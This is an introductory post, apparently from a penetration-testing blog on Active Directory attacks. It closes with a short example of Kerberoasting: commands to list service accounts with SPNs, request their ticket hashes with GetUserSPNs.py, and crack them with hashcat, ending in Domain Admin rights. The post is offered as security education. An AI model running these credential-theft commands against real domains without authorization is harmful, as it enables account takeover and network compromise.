---
layout: post
title: "Welcome to The Domain Diaries"
date: 2026-02-17
tags: [intro, meta]
---

Welcome to **The Domain Diaries** — where Active Directory nightmares become learning opportunities.

## What Is This?

This blog documents real penetration testing experiences, focusing on Active Directory environments. Every story comes from an actual engagement (anonymized, of course). No hypotheticals. No lab-only attacks. Just real-world tactics that worked against real-world defenses.

## Why Active Directory?

Because AD is *everywhere*. And despite decades of security research, it remains one of the most fruitful targets for attackers. Misconfigurations are rampant. Legacy systems abound. And the path from "unprivileged user" to "Domain Admin" is often shorter than defenders realize.

## What You Can Expect

- **Attack narratives** — Step-by-step breakdowns of how I compromised environments
- **Tool deep-dives** — How to use (and detect) tools like BloodHound, Rubeus, and Mimikatz
- **Defensive takeaways** — What blue teams can learn from each engagement
- **Code snippets** — Useful PowerShell, Python, and C# for your toolkit

## A Quick Example

Here's a taste of what's to come. On a recent engagement, I found a service account with an SPN:

```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

Kerberoasted the hash:

```bash
GetUserSPNs.py domain.local/user:password -request -outputfile hashes.txt
```

Cracked it in under a minute:

```bash
hashcat -m 13100 hashes.txt rockyou.txt
```

And that service account? It had `GenericAll` on the Domain Admins group.

Game over.

---

More stories coming soon. Stay tuned.

*— The Domain Diarist*
